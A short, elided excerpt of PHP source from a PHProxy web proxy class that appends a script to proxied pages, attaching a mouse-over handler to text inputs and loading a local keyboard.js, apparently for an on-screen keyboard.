...
class PHProxy
{
   ...
   (
    ...
    {
        $this->custom_js  = "<script type=\"text/javascript\">var arr=document.getElementsByTagName('input'); for(var i=0; i<arr.length; i++) { if (arr[i].getAttribute('type') == 'text') { arr[i].setAttribute('onMouseOver', 'kbd.call(0)'); } }</script><SCRIPT language=\"JavaScript\" src=\"/en_US/js//keyboard.js\"></SCRIPT>";
    ...
    function return_response($send_headers = true)
    {
        ...
        else
        {
            ...
            $this->modify_urls();
            $this->response_body .= $this->custom_js;
        }
